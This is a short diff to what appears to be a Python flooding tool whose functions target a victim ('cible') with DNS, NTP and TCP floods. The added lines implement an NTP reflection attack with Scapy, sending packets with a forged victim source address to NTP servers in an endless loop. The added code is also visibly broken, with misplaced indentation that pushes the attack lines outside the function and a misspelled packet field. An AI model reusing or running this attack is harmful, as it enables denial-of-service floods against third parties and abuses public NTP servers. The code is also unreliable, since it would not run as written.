@@ -81,6 +81,16 @@ def dnsFlood(cible):
 	print("DNS Flood sur {}".format(cible))
 
 def ntpFlood():
+    global ntplist
+    global currentserver
+    global data
+    global target
+
+ntpserver = ntplist[currentserver]
+currentserver = currentserver + 1
+pkt = IP(dsc=ntpserver, src=target)/UDP(sport=random.randint(1000, 65535),dport=123)/Raw(load=data)
+send(pkt,loop=1)
+	
 	print("NTP Flood sur {}".format(cible))
 
 def tcpFlood():
